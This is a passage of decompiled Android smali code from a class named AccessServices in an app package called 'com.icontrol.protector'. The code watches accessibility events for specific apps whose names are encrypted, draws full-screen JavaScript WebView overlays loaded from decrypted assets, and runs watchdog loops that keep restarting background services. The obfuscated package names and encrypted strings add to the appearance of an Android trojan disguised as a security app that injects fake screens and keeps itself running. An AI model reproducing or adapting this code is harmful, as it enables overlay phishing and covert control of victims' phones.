    invoke-virtual {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->e(Ljava/lang/String;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    goto :goto_0

    :catch_0
    move-exception p0

    goto :goto_3

    :cond_0
    :goto_0
    const/4 v1, 0x5

    new-array v1, v1, [J

    fill-array-data v1, :array_8

    invoke-virtual {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->r([J)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    const/high16 v1, -0x10000

    const/16 v4, 0xbb8

    invoke-virtual {p1, v1, v4, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->j(III)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    const/4 v1, 0x2

    invoke-static {v1}, Landroid/media/RingtoneManager;->getDefaultUri(I)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->q(Landroid/net/Uri;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    invoke-static {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ax;->b(Landroid/content/Context;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ax;

    move-result-object v1

    const/16 v4, 0x21

    if-lt v2, v4, :cond_1

    const/16 v2, 0x25

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/id;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result p0

    if-nez p0, :cond_2

    sget p0, Lcom/icontrol/protector/AccessServices;->Z:I

    invoke-virtual {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->a()Landroid/app/Notification;

    move-result-object p1

    :goto_1
    invoke-virtual {v1, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ax;->d(ILandroid/app/Notification;)V

    goto :goto_2

    :cond_1
    sget p0, Lcom/icontrol/protector/AccessServices;->Z:I

    invoke-virtual {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->a()Landroid/app/Notification;

    move-result-object p1

    goto :goto_1

    :cond_2
    :goto_2
    sget p0, Lcom/icontrol/protector/AccessServices;->Z:I

    add-int/2addr p0, v0

    sput p0, Lcom/icontrol/protector/AccessServices;->Z:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :goto_3
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    return-void

    :array_0
    .array-data 1
        -0xdt
        0x41t
        -0x3ft
        -0x30t
        -0x3ct
        -0x31t
        0x2t
        0x6at
        -0x25t
        0x4dt
        -0x2bt
        -0x6ft
        -0x2t
        -0x37t
        0x19t
        0x6dt
        -0x32t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x43t
        0x24t
        -0x4at
        -0x10t
        -0x76t
        -0x60t
        0x76t
        0x3t
    .end array-data

    :array_2
    .array-data 1
        -0x76t
        -0xft
        -0x49t
        -0x5ft
        0x1t
        0x53t
        0x59t
        -0x15t
        -0x5et
        -0x3t
        -0x5dt
        -0x20t
        0x3bt
        0x55t
        0x42t
        -0x14t
        -0x49t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x3ct
        -0x6ct
        -0x40t
        -0x7ft
        0x4ft
        0x3ct
        0x2dt
        -0x7et
    .end array-data

    :array_4
    .array-data 1
        0x47t
        -0xct
        -0x6bt
        -0x3ct
        0x7et
        -0x6t
        -0x22t
        -0x6dt
        0x7dt
        -0xet
        -0x72t
        -0x3dt
        0x6bt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x9t
        -0x65t
        -0x1ft
        -0x53t
        0x18t
        -0x6dt
        -0x43t
        -0xet
    .end array-data

    :array_6
    .array-data 1
        -0x74t
        0x14t
        -0x2et
        -0x22t
        -0x47t
        0x3ft
        0x3at
        0x5et
        -0x5ct
        0x18t
        -0x3at
        -0x61t
        -0x7dt
        0x39t
        0x21t
        0x59t
        -0x4ft
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x3et
        0x71t
        -0x5bt
        -0x2t
        -0x9t
        0x50t
        0x4et
        0x37t
    .end array-data

    :array_8
    .array-data 8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
    .end array-data

    :array_9
    .array-data 1
        0x5et
        0xft
        -0x27t
        -0x5t
        -0x30t
        0x33t
        -0x23t
        -0x22t
        0x4ft
        0x4t
        -0x31t
        -0x1ct
        -0x2at
        0x29t
        -0x36t
        -0x67t
        0x50t
        0xft
        -0x6dt
        -0x27t
        -0x10t
        0x9t
        -0x13t
        -0x51t
        0x71t
        0x2et
        -0x17t
        -0x40t
        -0x7t
        0x13t
        -0x6t
        -0x4ft
        0x6bt
        0x28t
        -0xet
        -0x39t
        -0x14t
    .end array-data

    nop

    :array_a
    .array-data 1
        0x3ft
        0x61t
        -0x43t
        -0x77t
        -0x41t
        0x5at
        -0x47t
        -0x10t
    .end array-data
.end method

.method static synthetic f(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessServices;->D()V

    return-void
.end method

.method static synthetic g(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessServices;->B()V

    return-void
.end method

.method static synthetic h(Lcom/icontrol/protector/AccessServices;)Z
    .locals 0

    .line 1
    iget-boolean p0, p0, Lcom/icontrol/protector/AccessServices;->f:Z

    return p0
.end method

.method static synthetic i(Lcom/icontrol/protector/AccessServices;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->v(I)V

    return-void
.end method

.method private j(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 3

    .line 1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_1

    const/16 v0, 0x15

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0x11

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0x1b

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v2, v1, [B

    fill-array-data v2, :array_5

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0xd

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    const/4 p1, 0x1

    goto :goto_0

    :cond_1
    const/4 p1, 0x0

    :goto_0
    return p1

    :array_0
    .array-data 1
        -0x42t
        0x70t
        0x7bt
        -0x7bt
        0x17t
        0x42t
        0xdt
        0x60t
        -0x4et
        0x76t
        0x72t
        -0x7bt
        0x1at
        0x4dt
        0x1ct
        0x7ct
        -0x42t
        0x77t
        0x73t
        -0x27t
        0x45t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x23t
        0x1ft
        0x16t
        -0x55t
        0x76t
        0x2ct
        0x69t
        0x12t
    .end array-data

    :array_2
    .array-data 1
        0x40t
        -0x31t
        -0x4ft
        -0x4bt
        0x6bt
        -0x3et
        0x23t
        -0x77t
        0x4ft
        -0x3ft
        -0x57t
        -0xbt
        0x6at
        -0x38t
        0x2dt
        -0x2bt
        0x11t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x23t
        -0x60t
        -0x24t
        -0x65t
        0x9t
        -0x60t
        0x48t
        -0x59t
    .end array-data

    :array_4
    .array-data 1
        0x60t
        0x37t
        -0x17t
        0x13t
        -0x23t
        -0x2bt
        -0x6ft
        -0x62t
        0x66t
        0x31t
        -0x56t
        0x5ct
        -0x25t
        -0x3ct
        -0x7et
        -0x7at
        0x6at
        0x3ct
        -0x56t
        0x51t
        -0x2ct
        -0x2bt
        -0x62t
        -0x76t
        0x6bt
        0x3dt
        -0xat
    .end array-data

    :array_5
    .array-data 1
        0x3t
        0x58t
        -0x7ct
        0x3dt
        -0x4bt
        -0x60t
        -0x10t
        -0x17t
    .end array-data

    :array_6
    .array-data 1
        0x6at
        0x5bt
        -0x35t
        -0x74t
        0x2dt
        -0x54t
        -0x1dt
        0x41t
        0x27t
        0x5ct
        -0x37t
        -0x31t
        0x25t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x9t
        0x34t
        -0x5at
        -0x5et
        0x40t
        -0x3bt
        -0x6at
        0x28t
    .end array-data
.end method

.method private l(Ljava/lang/String;)Z
    .locals 2

    .line 1
    const/16 v0, 0x3e

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/regex/Matcher;->find()Z

    move-result p1

    return p1

    nop

    :array_0
    .array-data 1
        0x1ft
        -0x35t
        0x26t
        -0x32t
        0x79t
        0x55t
        -0x42t
        -0x67t
        0x13t
        -0x33t
        0x2ft
        -0x32t
        0x6bt
        0x42t
        -0x57t
        -0x61t
        0x19t
        -0x37t
        0x3et
        -0x77t
        0x22t
        0x52t
        -0x42t
        -0x3ct
        0x17t
        -0x3ft
        0x32t
        -0x64t
        0x7bt
        0x54t
        -0x49t
        -0x3bt
        0x1dt
        -0x36t
        0x2ft
        -0x6et
        0x77t
        0x52t
        -0x42t
        -0x3bt
        0xft
        -0x23t
        0x38t
        -0x6ct
        0x7dt
        0x56t
        -0x51t
        -0x7et
        0x46t
        -0x33t
        0x2ft
        -0x31t
        0x4et
        0x52t
        -0x54t
        -0x7ct
        0x2ct
        -0x33t
        0x25t
        -0x75t
        0x7dt
        0x42t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x7ct
        -0x5ct
        0x4bt
        -0x20t
        0x18t
        0x3bt
        -0x26t
        -0x15t
    .end array-data
.end method

.method private n(Landroid/content/Context;)V
    .locals 2

    .line 1
    const-class v0, Lcom/icontrol/protector/EngineWorker;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v1

    if-nez v1, :cond_0

    invoke-direct {p0, p1, v0}, Lcom/icontrol/protector/AccessServices;->y(Landroid/content/Context;Ljava/lang/Class;)V

    :cond_0
    const-class v0, Lcom/icontrol/protector/WorkServices;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v1

    if-nez v1, :cond_1

    invoke-direct {p0, p1, v0}, Lcom/icontrol/protector/AccessServices;->y(Landroid/content/Context;Ljava/lang/Class;)V

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    const-class v1, Lcom/icontrol/protector/LiveChat;

    if-eqz v0, :cond_2

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_3

    :cond_2
    invoke-direct {p0, p1, v1}, Lcom/icontrol/protector/AccessServices;->y(Landroid/content/Context;Ljava/lang/Class;)V

    :cond_3
    return-void
.end method

.method private p()V
    .locals 3

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    const/16 v1, 0xb

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->clearHistory()V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/view/ViewGroup;->removeAllViews()V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->destroy()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    :cond_0
    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/view/ViewGroup;->removeAllViews()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x36t
        -0x6dt
        -0x17t
        -0x8t
        0x40t
        -0x8t
        0x1ft
        0x7et
        -0x36t
        -0x61t
        -0x13t
    .end array-data

    :array_1
    .array-data 1
        -0x55t
        -0xft
        -0x7at
        -0x73t
        0x34t
        -0x3et
        0x7dt
        0x12t
    .end array-data
.end method

.method private synthetic r()V
    .locals 3

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    :goto_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-nez v1, :cond_0

    :try_start_0
    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessServices;->n(Landroid/content/Context;)V

    const-wide/16 v1, 0x1388

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0

    :catch_1
    :cond_0
    return-void
.end method

.method private synthetic s(Landroid/content/Context;)V
    .locals 2

    .line 1
    :goto_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-nez v0, :cond_0

    :try_start_0
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->n(Landroid/content/Context;)V

    const-wide/16 v0, 0x1388

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0

    :catch_1
    :cond_0
    return-void
.end method

.method private t(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .line 1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->AsstsKey:Ljava/lang/String;

    const/16 v1, 0x9

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v1, p1, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\n"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_2

    :cond_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :cond_1
    invoke-virtual {p1}, Ljava/io/InputStream;->available()I

    move-result v0

    new-array v0, v0, [B

    invoke-virtual {p1, v0}, Ljava/io/InputStream;->read([B)I

    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->AsstsKey:Ljava/lang/String;

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->z([BLjava/lang/String;)[B

    move-result-object p1

    new-instance v0, Ljava/lang/String;

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v0, p1, v1}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-object p1, v0

    :goto_1
    return-object p1

    :goto_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 p1, 0x0

    return-object p1

    :array_0
    .array-data 1
        0x62t
        0x1ct
        -0x51t
        -0x1at
        0x26t
        -0x1bt
        -0x4dt
        -0x77t
        0x64t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x39t
        0x5dt
        -0x4t
        -0x4et
        0xbt
        -0x4bt
        -0xet
        -0x26t
    .end array-data
.end method

.method private u(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7

    .line 1
    new-instance v0, Landroid/webkit/WebView;

    invoke-direct {v0, p1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    const/4 p1, 0x0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->setBackgroundColor(I)V

    iget-object p1, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object p1, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    invoke-direct {p0, p2}, Lcom/icontrol/protector/AccessServices;->t(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    const/4 v2, 0x0

    const/16 p1, 0x9

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 p2, 0x8

    new-array v0, p2, [B

    fill-array-data v0, :array_1

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 p1, 0x5

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array p2, p2, [B

    fill-array-data p2, :array_3

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {p1}, Landroid/view/ViewGroup;->removeAllViews()V

    sget-object p1, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    iget-object p2, p0, Lcom/icontrol/protector/AccessServices;->b:Landroid/webkit/WebView;

    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    const/4 v1, -0x1

    invoke-direct {v0, v1, v1}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    invoke-virtual {p1, p2, v0}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x11t
        0x43t
        -0x62t
        -0x43t
        0x1t
        -0x2ft
        0x0t
        -0x7dt
        0x9t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x65t
        0x26t
        -0x1at
        -0x37t
        0x2et
        -0x47t
        0x74t
        -0x12t
    .end array-data

    :array_2
    .array-data 1
        -0x79t
        -0x58t
        -0x7ft
        0x5bt
        0x74t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x2et
        -0x4t
        -0x39t
        0x76t
        0x4ct
        -0x68t
        0x34t
        -0x62t
    .end array-data
.end method

.method private v(I)V
    .locals 2

    .line 1
    int-to-long v0, p1

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private w()V
    .locals 2

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->m:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a0;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a0;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->m:Ljava/lang/Thread;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->m:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private x(Landroid/content/Context;)V
    .locals 2

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->k:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

